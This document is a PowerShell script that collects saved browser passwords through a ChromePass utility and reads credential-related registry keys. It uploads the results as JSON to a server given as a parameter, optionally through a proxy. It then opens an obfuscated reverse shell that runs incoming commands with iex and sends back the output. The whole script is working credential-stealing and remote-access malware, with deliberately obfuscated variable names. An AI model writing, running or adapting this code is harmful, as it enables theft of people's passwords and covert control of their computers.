param (
    [string]$ip,
    [int]$port,
    [string]$serverUrl,
    [string]$proxyUrl
)

# Obfuscated variable names
$A = 'Get'+'Stream'
$C = [System.Text.Encoding]::'ASCII'
$b = 0..65535 | % {0}
$Q = 'System.Net.Sockets.TCPClient'
$w = 'Re'+'ad'
$O = 'Wr'+'ite'
$F = 'System.Text.ASCIIEncoding'

# Function to collect browser data
function Get-BrowserData {
    $data = @{}

    # Collect Chrome passwords (requires ChromePass utility)
    if (Test-Path "C:\path\to\ChromePass.exe") {
        $chromePasswords = & "C:\path\to\ChromePass.exe" /scomma "C:\path\to\chrome_passwords.txt"
        $data.ChromePasswords = Get-Content -Path "C:\path\to\chrome_passwords.txt"
    }

    # Collect Firefox cookies (requires appropriate access and utilities)
    # Add similar commands for Firefox cookies, certificates, etc.

    # Collect Edge passwords
    # Add similar commands for Edge passwords, cookies, certificates, etc.

    return $data
}

# Function to collect registry data
function Get-RegistryData {
    $data = @{}

    # Search for saved passwords in the registry
    $paths = @(
        "HKCU:\Software\Microsoft\Internet Explorer\IntelliForms\Storage2",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\CredentialStorage",
        # Add more registry paths as needed
    )

    foreach ($path in $paths) {
        if (Test-Path $path) {
            $data[$path] = Get-ItemProperty -Path $path
        }
    }

    return $data
}

# Function to upload data to the server
function Upload-Data {
    param (
        [hashtable]$data,
        [string]$url,
        [string]$proxy
    )

    $jsonData = $data | ConvertTo-Json
    $webClient = New-Object System.Net.WebClient

    if ($proxy -ne $null -and $proxy -ne '') {
        $webProxy = New-Object System.Net.WebProxy($proxy, $true)
        $webClient.Proxy = $webProxy
    }

    $webClient.Headers.Add("Content-Type", "application/json")
    $webClient.UploadString($url, $jsonData)
}

# Main script execution
try {
    $browserData = Get-BrowserData
    $registryData = Get-RegistryData

    # Combine the collected data
    $allData = @{
        BrowserData = $browserData
        RegistryData = $registryData
    }

    # Upload the collected data to the server
    Upload-Data -data $allData -url "$serverUrl/upload_endpoint" -proxy "$proxyUrl"

    # Establish reverse shell connection
    $client = New-Object $Q($ip, $port)
    $stream = $client.$A()
    while (($i = $stream.$w($b, 0, $b.Length)) -ne 0) {
        $d = (New-Object -TypeName $F).GetString($b, 0, $i)
        $S = (iex $d 2>&1 | Out-String)
        $R = $S + "PS " + (pwd).Path + "> "
        $f = $C.GetBytes($R)
        $stream.$O($f, 0, $f.Length)
        $stream.Flush()
    }
    $client.Close()
} catch {
    Write-Output "An error occurred: $_"
}
